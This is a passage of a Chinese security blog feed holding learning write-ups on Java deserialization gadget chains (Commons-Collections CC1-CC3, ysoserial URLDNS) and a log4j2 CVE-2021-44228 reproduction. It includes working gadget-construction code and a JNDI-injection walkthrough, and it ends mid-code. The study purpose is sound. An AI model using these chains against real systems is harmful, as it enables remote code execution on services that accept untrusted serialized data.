<span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashSet hashSet = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">    <span class="comment">// 由于创建hashset后，会自动给lazyMap添加一个key-value，所以要remove掉这个键值对</span></span><br><span class="line"><span class="comment">// 以保证lazyMap.get时，map.containsKey(key) == false，从而进入transform函数</span></span><br><span class="line">        lazyMap.clear();  </span><br><span class="line">    </span><br><span class="line">        Field iTransformers = ChainedTransformer.class.getDeclaredField((<span class="string">&quot;iTransformers&quot;</span>));</span><br><span class="line">        iTransformers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;serialize.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashSet);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;serialize.ser&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第34行调用一次<code>clear()</code>是因为<code>hashSet.add</code>会将<code>key/value</code> <code>put</code>到LazyMap中，若不<code>clear()</code>会导致反序列化时LazyMap包含该<code>key</code>，从而进不到if语句内，无法触发<code>transform</code></p><img src="/2022/03/25/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE1-7%E5%AD%A6%E4%B9%A0/image-20220320230828331.png" class="" title="image-20220320230828331"><p>这条链在jdk高版本也可以触发</p><img src="/2022/03/25/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE1-7%E5%AD%A6%E4%B9%A0/image-20220320232027461.png" class="" title="image-20220320232027461"><h2 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h2><p>先贴下CC3的利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Gadget chain:</span></span><br><span class="line"><span class="comment">      ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">         AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">            Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">               AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">                  LazyMap.get()</span></span><br><span class="line"><span class="comment">                     ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                        ConstantTransformer.transform()  // 上面和CC1相同</span></span><br><span class="line"><span class="comment">                        InstantlateTransformer.transform()</span></span><br><span class="line"><span class="comment">                        newinstance()</span></span><br><span class="line"><span class="comment">                        TrAXFllter#TrAXFllter()</span></span><br><span class="line"><span class="comment">                        Templateslmpl.newTransformer()</span></span><br><span class="line"><span class="comment">                        Templateslmpl.getTransletinstance()</span></span><br><span class="line"><span class="comment">                        Templateslmpl.defineTransletClasses()</span></span><br><span class="line"><span class="comment">                        newinstance()</span></span><br><span class="line"><span class="comment">                        Runtlme.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>CC3的前半截调用过程和CC1一样，区别就是CC3用<code>InstantiateTransformer</code>代替了CC1的<code>InvokerTransformer</code>，并且通过字节码的方式触发，其关键点就在<code>TemplatesImpl</code>和<code>TrAXFilter</code>类</p><h3 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h3><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这些CC链看起来复杂，其实真正分析下去，会发现利用链路很清晰，并且各个链有一定的联系和相似之处。《java安全漫谈》中p牛并没有从cc1-7挨个讲解，而是根据自己学习探索过程中发现的问题，深入思考如何解决问题和进一步思考优化利用链，从而使多个CC链的关系能够串起来方便理解，大佬的学习方式值得学习，同时感叹独立思考也很重要。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://www.cnblogs.com/bitterz/p/15035581.html" >commons-collections利用链学习总结<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://github.com/phith0n/JavaThings" >Java安全漫谈 系列<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://github.com/frohoff/ysoserial" >ysoserial项目<i class="fas fa-external-link-alt"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ysoserial URLDNS分析</title>
      <link href="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/"/>
      <url>/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在学习p牛的《java安全漫谈》，文中许多简化版易于理解的demo，根据对demo的理解结合<code>ysoserial</code>源码学习java反序列化，对<code>ysoserial</code>源码分析过程做下记录，本文先记录下URLDNS的分析过程，后续再继续学习记录所有CC链的分析过程，冲冲冲。</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="如何调试ysoserial"><a href="#如何调试ysoserial" class="headerlink" title="如何调试ysoserial"></a>如何调试ysoserial</h3><p><code>ysoserial</code>所有payload都放在<code>src/main/java/ysoserial/payloads</code>目录，目录下每个文件都有一个<code>main</code>方法，我们要调试哪个利用链，只需要调试对应的java文件即可，例如URLDNS.java的<code>main</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">               PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p><code>payloads</code>目录下所有的<code>main</code>方法都会调用<code>PayloadRunner.run()</code>，跟进<code>PayloadRunner.run()</code>方法，可以看到主要逻辑是将传入第一个参数实例化后调用该类的<code>getObject</code>方法，接着将<code>getObject</code>方法的返回的对象序列化和反序列化，所以利用链的构造逻辑主要在<code>getObject</code>方法内。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">final</span> Class&lt;? extends ObjectPayload&lt;?&gt;&gt; clazz, <span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">   <span class="comment">// ensure payload generation doesn&#x27;t throw an exception</span></span><br><span class="line">   <span class="keyword">byte</span>[] serialized = <span class="keyword">new</span> ExecCheckingSecurityManager().callWrapped(<span class="keyword">new</span> Callable&lt;<span class="keyword">byte</span>[]&gt;()&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">byte</span>[] call() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">         <span class="keyword">final</span> String command = args.length &gt; <span class="number">0</span> &amp;&amp; args[<span class="number">0</span>] != <span class="keyword">null</span> ? args[<span class="number">0</span>] : getDefaultTestCmd();</span><br><span class="line"></span><br><span class="line">         System.out.println(<span class="string">&quot;generating payload object(s) for command: &#x27;&quot;</span> + command + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">         ObjectPayload&lt;?&gt; payload = clazz.newInstance();</span><br><span class="line">               <span class="keyword">final</span> Object objBefore = payload.getObject(command);</span><br><span class="line"></span><br><span class="line">         System.out.println(<span class="string">&quot;serializing payload&quot;</span>);</span><br><span class="line">         <span class="keyword">byte</span>[] ser = Serializer.serialize(objBefore);</span><br><span class="line">         Utils.releasePayload(payload, objBefore);</span><br><span class="line">               <span class="keyword">return</span> ser;</span><br><span class="line">   &#125;&#125;);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;deserializing payload&quot;</span>);</span><br><span class="line">      <span class="keyword">final</span> Object objAfter = Deserializer.deserialize(serialized);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>来看下URLDNS的<code>getObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">        <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">        URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">        HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">        URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">        ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">        Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑比较简单，将一个<code>URL</code>对象put到<code>HashMap</code>的key，再将<code>URL</code>的<code>hashCode</code>设置为<code>-1</code>后返回，11行注释指出了只有<code>hashCode</code>设置<code>-1</code>才能触发DNS请求。</p><p>触发反序列化的方法是在<code>readObject</code>方法，上面<code>getObject</code>返回的是一个HashMap对象，所以先看下<code>HashMap</code>类的<code>readObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>hash</code>函数在41行，所以直接在41行下断点</p><img src="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/image-20220225103112305.png" class="" title="image-20220225103112305"><p>跟进<code>hash</code>函数，接着调用了URL的<code>hashCode</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在URL类的<code>hashCode</code>可以看到<code>hashCode</code>为<code>-1</code>才往下走，所以前面<code>getObject</code>函数中才会将<code>hashCode</code>设置为<code>-1</code>，接着调用<code>URLStreamHandler</code> 对象的<code>hashcode</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟入<code>hashCode</code>，将URL传入的<code>getHostAddress</code>方法</p><img src="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/image-20220225105425560.png" class="" title="image-20220225105425560"><p>跟进<code>getHostAddress</code>方法，通过<code>InetAddress.getByName</code>将主机名转化为IP，也就是执行一次DNS查询</p><img src="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/image-20220225105549303.png" class="" title="image-20220225105549303"><p>查看第三方反连平台，接收到了DNS请求，说明确实存在反序列化漏洞</p><img src="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/image-20220225105815270.png" class="" title="image-20220225105815270"><p>调用链如下</p><img src="/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/image-20220225111335501.png" class="" title="image-20220225111335501"><p>所以URLDNS的<code>Gadget</code>为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">-&gt;HashMap.hash()</span><br><span class="line">-&gt;URL.hashCode()</span><br><span class="line">-&gt;URLStreamHandler.hashCode()</span><br><span class="line">-&gt;URLStreamHandler.getHostAddress()</span><br><span class="line">-&gt;InetAddress.getByName()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>URLDNS调试起来简单清晰，确实比较适合像我这种入门级选手初次调试反序列流程，URLDNS只能触发DNS请求，并不能说是一个利用链，所以通常用URLDNS来判断是否存在反序列化漏洞。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://wx.zsxq.com/dweb2/index/topic_detail/548242484442524" >《Java安全漫谈 - 08.认识最简单的Gadget——URLDNS》<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://github.com/frohoff/ysoserial" >ysoserial项目<i class="fas fa-external-link-alt"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>log4j2 RCE分析与复现</title>
      <link href="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>去年12月份爆出了<code>log4j2 RCE</code>的漏洞（<code>CVE-2021-44228</code>），该漏洞利用难度低，危害大，且影响范围广泛，这将有可能是载入安全史册的漏洞，作为史诗级漏洞的见证者，写个漏洞分析留个底还是有必要的😄</p><h2 id="0x00-漏洞复现"><a href="#0x00-漏洞复现" class="headerlink" title="0x00 漏洞复现"></a>0x00 漏洞复现</h2><p>复现比较简单，先引入<code>log4j</code> 版本<code>2.14.1</code>的包，我这里配的是<code>lombok</code>+<code>sprint-boot-starter-log4j2</code>，<code>starter 2.5.7</code>依赖的是<code>2.14.1</code>版本的log4j</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123122258173.png" class="" title="image-20220123122258173"><p>或者换做直接引<code>log4j</code>的包也是OK的。</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220219150315768.png" class="" title="image-20220219150315768"><p>通过JNDI注入利用<a class="link"   href="https://github.com/welk1n/JNDI-Injection-Exploit" >工具<i class="fas fa-external-link-alt"></i></a>在本地启动JNDI服务，根据项目JDK版本在<code>log.error</code>中插入对应payload即可触发</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123155520880.png" class="" title="image-20220123155520880"><h2 id="0x01-代码分析"><a href="#0x01-代码分析" class="headerlink" title="0x01 代码分析"></a>0x01 代码分析</h2><h3 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h3><p>跟入error方法，在<code>AbstractLogger</code>类的<code>logIfEnabled</code>方法中进行一层判断，满足了配置的log等级才输出日志</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isEnabled(level, marker, message)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logMessage(fqcn, level, marker, message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟到<code>isEnabled</code>方法下面看看是怎么判断，可以看到filter方法中302行会判断传入的level是否大于配置的level，日志输出等级从低到高是<code>All &lt; Trace &lt; Debug &lt; Info &lt; Warn &lt; Error &lt; Fatal &lt; OFF</code>，程序会打印高于或等于所设置级别的日志，而默认配置为<code>error</code>等级，这也就是为什么默认配置下<code>error</code>和<code>fatal</code>可以触发，而<code>debug/info/warn</code>触发不了的原因。</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123163628452.png" class="" title="image-20220123163628452"><p>我们也可以通过修改log4j2.xml配置来配置日志输出等级</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220219145944559.png" class="" title="image-20220219145944559"><p>接着从<code>logMessage</code>方法往下跟到<code>AbstractOutputStreamAppender</code>类的<code>directEncodeEvent</code>方法，89行跟入<code>encode</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">directEncodeEvent</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 跟入</span></span><br><span class="line">    <span class="keyword">this</span>.getLayout().encode(event, <span class="keyword">this</span>.manager);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.immediateFlush || event.isEndOfBatch()) &#123;</span><br><span class="line">        <span class="keyword">this</span>.manager.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>PatternLayout</code>类实现<code>encode</code>方法，接着关注<code>toText</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">encode</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> ByteBufferDestination destination)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="keyword">this</span>.eventSerializer <span class="keyword">instanceof</span> Serializer2)) &#123;</span><br><span class="line">        <span class="keyword">super</span>.encode(event, destination);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 跟入toText方法</span></span><br><span class="line">        StringBuilder text = <span class="keyword">this</span>.toText((Serializer2)<span class="keyword">this</span>.eventSerializer, event, getStringBuilder());</span><br><span class="line">        Encoder&lt;StringBuilder&gt; encoder = <span class="keyword">this</span>.getStringBuilderEncoder();</span><br><span class="line">        encoder.encode(text, destination);</span><br><span class="line">        trimToMaxSize(text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> StringBuilder <span class="title">toText</span><span class="params">(<span class="keyword">final</span> Serializer2 serializer, <span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder destination)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> serializer.toSerializable(event, destination);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="消息格式化"><a href="#消息格式化" class="headerlink" title="消息格式化"></a>消息格式化</h3><p>跟入<code>toSerializable</code>方法，遍历类型为<code>org.apache.logging.log4j.core.pattern.PatternFormatter</code>类的<code>formatters</code>数组，调用其<code>format</code>方法，这里只需关注第8次循环的<code>format</code>方法，漏洞就是在这个<code>format</code>中触发</p><img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123174526935.png" class="" title="image-20220123174526935"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.skipFormattingInfo) &#123;</span><br><span class="line">        <span class="comment">// 第8次循环的converter实现为MessagePatternConverter类，跟入</span></span><br><span class="line">        <span class="keyword">this</span>.converter.format(event, buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.formatWithInfo(event, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看看<code>MessagePatternConverter</code>中的<code>format</code>实现，在判断log内容包含<code>$&#123;</code>后，将<code>evet</code>带入的<code>replace</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> </span>&#123;</span><br><span class="line">    Message msg = event.getMessage();</span><br><span class="line">    <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) 